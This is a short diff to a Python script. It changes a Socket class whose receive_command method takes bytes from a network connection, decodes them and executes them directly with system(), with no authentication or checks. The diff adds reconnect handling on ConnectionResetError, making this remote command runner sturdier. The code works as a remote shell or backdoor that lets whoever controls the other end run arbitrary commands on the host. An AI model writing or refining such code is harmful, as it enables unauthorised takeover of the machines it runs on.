@@ -18,10 +18,13 @@ class Socket:
             print("No connection established!")
 
     def receive_command(self):
-        cmd = self.active_socket.recv(64)
+        try:
+            cmd = self.active_socket.recv(64)
+        except ConnectionResetError:
+            self.established = False
+            return False
         cmd = cmd.decode()
         system(cmd)
-        Socket.cmd_received = False
 
 
 connection = Socket()
